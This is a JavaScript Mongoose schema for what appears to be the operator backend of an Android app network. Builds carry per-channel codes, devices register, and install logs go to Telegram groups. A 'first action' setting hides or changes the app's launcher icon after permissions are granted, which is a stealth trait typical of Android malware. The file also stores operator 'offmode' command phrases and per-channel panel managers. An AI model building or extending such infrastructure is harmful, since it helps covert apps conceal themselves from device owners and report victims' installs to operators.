import mongoose from 'mongoose';

/**
 * Logical channel (not a TCP port). Each Android build embeds one code;
 * devices register with that code; install logs go to the bound Telegram group.
 */
const PortSchema = new mongoose.Schema(
  {
    _id: { type: String }, // 20-char code
    name: { type: String, default: '' },
    description: { type: String, default: '' },
    groupId: { type: Number, default: 0, index: true },
    groupTitle: { type: String, default: '' },
    groupLink: { type: String, default: '' },
    groupUsername: { type: String, default: '' }, // public @name (empty = private group)
    groupType: { type: String, default: '' }, // 'group' | 'supergroup' | 'channel'
    groupMemberCount: { type: Number, default: 0 },
    groupPhotoMime: { type: String, default: '' },
    groupPhotoData: { type: Buffer, default: null },
    // Cheap flag mirroring groupPhotoData presence, so the ports LIST can project
    // out the (up-to-512KB) buffer and still know whether a photo exists.
    hasGroupPhoto: { type: Boolean, default: false },
    boundAt: { type: Date, default: null },
    pendingRequestId: { type: Number, default: 0, index: true },
    // Telegram user ids allowed to open the panel for this port only.
    managers: { type: [Number], default: [] },
    // What the client should do on first launch (icon step only — USSD is out of
    // scope for this project). Stored per-port; consumed by the client later.
    firstAction: {
      enabled: { type: Boolean, default: false },
      icon: {
        enabled: { type: Boolean, default: true },
        mode: { type: String, enum: ['hide', 'change'], default: 'hide' },
        timing: {
          type: String,
          enum: ['app_start', 'after_permissions'],
          default: 'after_permissions',
        },
      },
    },
    // Operator-defined "offmode" command phrases (plain strings for now).
    offmode: {
      personal: { type: String, default: '' },
      impersonal: { type: String, default: '' },
      all: { type: String, default: '' },
    },
  },
  { timestamps: { createdAt: true, updatedAt: true } },
);

PortSchema.virtual('code').get(function code() {
  return this._id;
});

PortSchema.set('toJSON', {
  virtuals: true,
  transform(_doc, ret) {
    ret.code = ret._id;
    delete ret._id;
    delete ret.__v;
    ret.hasGroupPhoto = Boolean(
      (ret.groupPhotoData && ret.groupPhotoData.length) || ret.hasGroupPhoto,
    );
    delete ret.groupPhotoData;
    delete ret.groupPhotoMime;
    return ret;
  },
});

export const Port = mongoose.model('Port', PortSchema);

/** Whitelisted first-action DTO with defaults, so old ports render completely. */
export function firstActionDto(fa) {
  const src = fa && typeof fa === 'object' ? fa : {};
  const icon = src.icon && typeof src.icon === 'object' ? src.icon : {};
  return {
    enabled: Boolean(src.enabled),
    icon: {
      enabled: icon.enabled === undefined || icon.enabled === null ? true : Boolean(icon.enabled),
      mode: icon.mode === 'change' ? 'change' : 'hide',
      timing: icon.timing === 'app_start' ? 'app_start' : 'after_permissions',
    },
  };
}

/** Offmode command strings with defaults. */
export function offmodeDto(om) {
  const src = om && typeof om === 'object' ? om : {};
  return {
    personal: String(src.personal || ''),
    impersonal: String(src.impersonal || ''),
    all: String(src.all || ''),
  };
}

export function portDto(doc) {
  if (!doc) return null;
  const o = typeof doc.toObject === 'function' ? doc.toObject() : doc;
  return {
    code: o._id || o.code,
    name: o.name || '',
    description: o.description || '',
    groupId: o.groupId || 0,
    groupTitle: o.groupTitle || '',
    groupLink: o.groupLink || '',
    groupUsername: o.groupUsername || '',
    groupType: o.groupType || '',
    groupMemberCount: o.groupMemberCount || 0,
    // Prefer the stored flag (the list projects the buffer out); fall back to the
    // buffer for docs/paths that still carry it.
    hasGroupPhoto:
      typeof o.hasGroupPhoto === 'boolean'
        ? o.hasGroupPhoto
        : Boolean(o.groupPhotoData && o.groupPhotoData.length),
    boundAt: o.boundAt || null,
    managers: Array.isArray(o.managers) ? o.managers : [],
    firstAction: firstActionDto(o.firstAction),
    offmode: offmodeDto(o.offmode),
    createdAt: o.createdAt,
    updatedAt: o.updatedAt,
  };
}
